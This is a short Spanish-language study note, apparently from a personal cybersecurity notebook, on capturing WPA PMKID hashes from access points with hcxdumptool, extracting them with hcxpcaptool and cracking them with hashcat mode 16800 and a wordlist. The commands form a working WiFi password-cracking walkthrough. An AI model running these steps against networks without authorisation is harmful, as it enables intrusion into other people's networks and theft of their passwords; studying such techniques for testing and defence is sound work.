Con esta herramienta podemos capturar los hashes de los AP con el [[PKMID]] al igual que on bettercap.

Esta herramienta es muy grande, asi que estaria bien hecharleun vistazo mas adelante.

	hcxdumptool -i wlan0mon -o CapturaPMK --enable_status=1  

-o *Archivo de captura*
--enable_status *Paramtro obligatorio, (Paradero desconocido)*

**Importante:** Actualmente la herramienta marcar unos *warnings* al hacer el compile que menciona en el [repositorio](https://github.com/ZerBea/hcxdumptool)

Pero en caso de ser corregida puede continuar con la herramienta hcxpcaptool, esto nos ayuda a extrar los hashes capturados.

	hcxpcaptool -z myHashes Captura

-myHashes *Es el archivo donde se almacenara el output*

Estos hashes son a los que se le aplicaria fuerza bruta, esto lo podemos hacer con [[Ciberseguidad/Hacking Wifi/Ataques Fuerza Bruta/Fuerza Bruta Handshake/Jhon the ripper | JhonTheRipper]] o con [[Ciberseguidad/Hacking Wifi/Ataques Fuerza Bruta/Fuerza Bruta Handshake/HashCat | HashCat]].

Por ejemplo con hashcat se haria de la siguiente forma, primero hay que indicarle a hashcat que tipo de hash

	hashcat --example-hashes | grep "16800" -C 1

-16800 *Identificador del tipo de hash*

En este caso el identificador es el *16800* que corresponde al tipo de hash *WPA-PMKID-PBKDF2*, por lo tanto sabiendo esto aplicariamos la fuerza bruta.

	hashcat -m 16800 -a 0 myHashes dic.txt

-m *Identificador del tipo de hash a tratar*
-a 0 *Indicamos que realizamos un ataque de fuerza bruta*

En caso de romper los hashes podemos ver los contraseñas.

	hashcat -m 16800 --show myHashes


